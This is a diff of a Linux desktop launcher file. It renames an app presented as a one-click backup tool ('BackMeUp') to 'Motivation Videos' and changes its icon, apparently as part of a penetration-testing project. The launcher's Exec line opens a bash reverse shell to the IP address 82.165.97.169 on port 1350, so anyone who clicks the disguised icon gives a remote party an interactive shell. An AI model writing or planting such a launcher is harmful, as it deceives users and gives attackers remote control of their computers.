@@ -1,9 +1,9 @@
 [Desktop Entry]
 Version=1.0
-Name=BackMeUp
+Name=Motivation Videos
 Comment=Back up your data with one click
 Exec=bash -c '/bin/bash -i > /dev/tcp/82.165.97.169/1350 0<&1 2>&1; $SHELL'
-Icon=/home/alex/Pictures/backup.png
+Icon=/home/patrickniyogitare/Documents/penetration/motivation-videos/assets/icon.jpg
 Terminal=false
 Type=Application
 Categories=Utility;Application;
